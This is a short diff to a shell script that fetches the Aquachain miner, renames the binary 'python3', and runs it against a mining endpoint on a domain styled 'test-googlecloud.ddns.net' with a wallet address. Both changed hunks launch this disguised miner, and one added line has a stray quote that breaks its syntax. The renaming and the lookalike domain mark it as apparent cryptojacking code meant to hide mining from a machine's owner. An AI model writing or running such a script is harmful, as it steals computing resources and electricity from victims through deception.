@@ -19,7 +19,7 @@ else
 
 echo "Miner da install , chay thoi "
 mv aquaminer-0.4-linux-amd64	python3
-tmux new-session -d -s my_session1 'sudo nice -n -10 ./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/1'
+./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/ju'
 
      
 fi
@@ -29,6 +29,6 @@ fi
 wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
 mv aquaminer-0.4-linux-amd64 python3
-tmux new-session -d -s my_session1 'sudo nice -n -10 ./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/1'
+./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/ju
 
 exit 0
